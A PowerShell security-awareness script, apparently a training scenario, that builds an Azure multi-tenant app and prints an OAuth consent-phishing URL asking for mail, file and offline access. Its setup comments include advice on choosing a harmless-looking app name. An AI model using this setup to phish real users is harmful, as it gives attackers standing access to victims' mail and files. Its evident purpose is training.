
<#
Scenario 3 – Multi-tenant attacker-style (realistic consent phishing)

This script generates an OAuth URL for a multi-tenant app (AzureADMultipleOrgs) and redirects to pwndstars.html.
It demonstrates how attackers use the real Microsoft sign-in page and a convincing consent prompt to obtain
access/refresh tokens (if consent is granted). For SAT, we DO NOT exchange codes for tokens.

Prerequisites:
- GitHub Pages enabled; the file 'docs/pwndstars.html' MUST exist and be published.
- Your multi-tenant app must be registered and the redirect URI(s) added.

Consistency CLI (run once to set up the app):
1) Login to Azure
   az login
   # Authenticate to Azure CLI in the tenant where you own this app

2) Create the multi-tenant app (captures appId)
   az ad app create `
     --display-name "TODO Security Portal" `     # Neutral name; avoid 'Microsoft', 'Teams', etc.
     --sign-in-audience AzureADMultipleOrgs `
     --web-redirect-uris "https://rolling-code.github.io/PowerShell-Scripts/pwndstars.html" `
     --enable-id-token-issuance true
   # Save the returned "appId" (client ID)

3) Create the service principal (optional but recommended)
   az ad sp create --id <APP_ID>               # Use YOUR appId here
   # Makes the app manageable under Enterprise applications

4) Declare Graph delegated scopes (identical across scenarios)
   # We do this programmatically by calling scope_declaration_function() below
   # Ensures the consent screen shows User.Read, Mail.Read, Files.Read (and offline_access requested in URL)

5) Add additional redirect URIs if needed
   az ad app update `
     --id <APP_ID> `                            # Use YOUR appId here
     --web-redirect-uris "https://rolling-code.github.io/PowerShell-Scripts/pwndstars.html" `
                         "https://rolling-code.github.io/PowerShell-Scripts/"
   # Keep URIs synchronized with GitHub

6) Run this script to generate the URL and test in a browser
#>

[CmdletBinding()]
param(
    [string] $RedirectUri = "https://rolling-code.github.io/PowerShell-Scripts/pwndstars.html",   # TODO MUST exist in GitHub /docs
    [string] $ClientId    = "TODO",                               # TODO Use YOUR appId here (from Step 2)
    [string] $Scope       = "openid profile offline_access User.Read Mail.Read Files.Read"
)

# ---- include helper ----
. .\helper_scopes.ps1

# Configure app's required resource access so consent screen matches URL scopes
# Fails if not az logged in, fine if already done. 
# Presumable if you created the app for this URL you were logged in or are logged in.
scope_declaration_function -AppId $ClientId -IncludeMailAndFiles

function Encode([string] $s) { [System.Uri]::EscapeDataString($s) }

$encRedirect = Encode $RedirectUri
$encScope    = Encode $Scope
$state       = "sim-" + [Guid]::NewGuid().ToString()

# Multi-tenant app => /common authority
$base = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"

$authUrl = "$base" +
           "?client_id=$ClientId" +
           "&response_type=code" +
           "&redirect_uri=$encRedirect" +
           "&scope=$encScope" +
           "&state=$state"

Write-Host ([Environment]::NewLine + "--- OAuth URL (Multi-tenant pwnd demo) ---") -ForegroundColor Green
Write-Host $authUrl -ForegroundColor Yellow

try {
    $authUrl | clip
    Write-Host ([Environment]::NewLine + "(Copied to clipboard.)") -ForegroundColor Cyan
} catch {
    Write-Verbose ('Clipboard copy failed: ' + $_)
}
